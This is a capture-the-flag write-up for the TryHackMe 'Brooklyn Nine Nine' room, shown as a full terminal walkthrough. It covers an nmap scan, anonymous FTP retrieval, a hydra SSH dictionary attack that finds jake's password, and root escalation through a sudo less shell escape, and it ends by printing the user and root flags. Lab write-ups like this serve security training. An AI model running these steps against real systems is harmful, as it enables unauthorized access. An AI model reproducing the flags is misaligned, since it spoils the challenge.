| Category          | Details                                                           |
|-------------------|-------------------------------------------------------------------|
| 📝 **Name**       | [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine) |  
| 🏷 **Type**       | THM Challenge                                                     |
| 🖥 **OS**         | Linux                                                             |
| 🎯 **Difficulty** | Easy                                                              |
| 📁 **Tags**       | weak password, sudo less                                          |

## Task 1: Deploy and get hacking

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Brooklyn Nine Nine]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 07:04 +0100
Nmap scan report for 10.82.168.104
Host is up (0.047s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.130.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.86 seconds
```

#### Enumerate FTP
```
┌──(magicrc㉿perun)-[~/attack/THM Brooklyn Nine Nine]
└─$ ftp anonymous@$TARGET
Connected to 10.82.168.104.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56020|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||42065|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |*******************************************************************************************************************************************************|   119      129.84 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (2.12 KiB/s)
```

#### Read exfiltrated `note_to_jake.txt` file
```
┌──(magicrc㉿perun)-[~/attack/THM Brooklyn Nine Nine]
└─$ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
It seems that user `jake` is using weak password. Since web enumeration did not yield any results, we will use weak password as vector of attack.

#### Conduct dictionary attack over SSH against user `jake`
```
┌──(magicrc㉿perun)-[~/attack/THM Brooklyn Nine Nine]
└─$ hydra -I -l jake -P /usr/share/wordlists/rockyou.txt ssh://$TARGET  
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-27 07:09:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://10.82.168.104:22/
[22][ssh] host: 10.82.168.104   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-27 07:09:39
```

#### Access target over SSH using `jake:987654321` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Brooklyn Nine Nine]
└─$ ssh jake@$TARGET  
<SNIP>
jake@brookly_nine_nine:~$ id
uid=1000(jake) gid=1000(jake) groups=1000(jake)
```

#### Capture user flag
```
jake@brookly_nine_nine:~$ cat /home/holt/user.txt 
ee11cbb19052e40b07aac0ca060c23ee
```

### Root flag

#### List allowed `sudo` commands
```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

#### Use `sudo /usr/bin/less` to escalate to `root` user
```
jake@brookly_nine_nine:~$ sudo /usr/bin/less /etc/hostname
brookly_nine_nine
!/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
# grep 'flag: ' /root/root.txt | cut -d' ' -f5
63a9f0ea7bb98050796b649e85481845
```
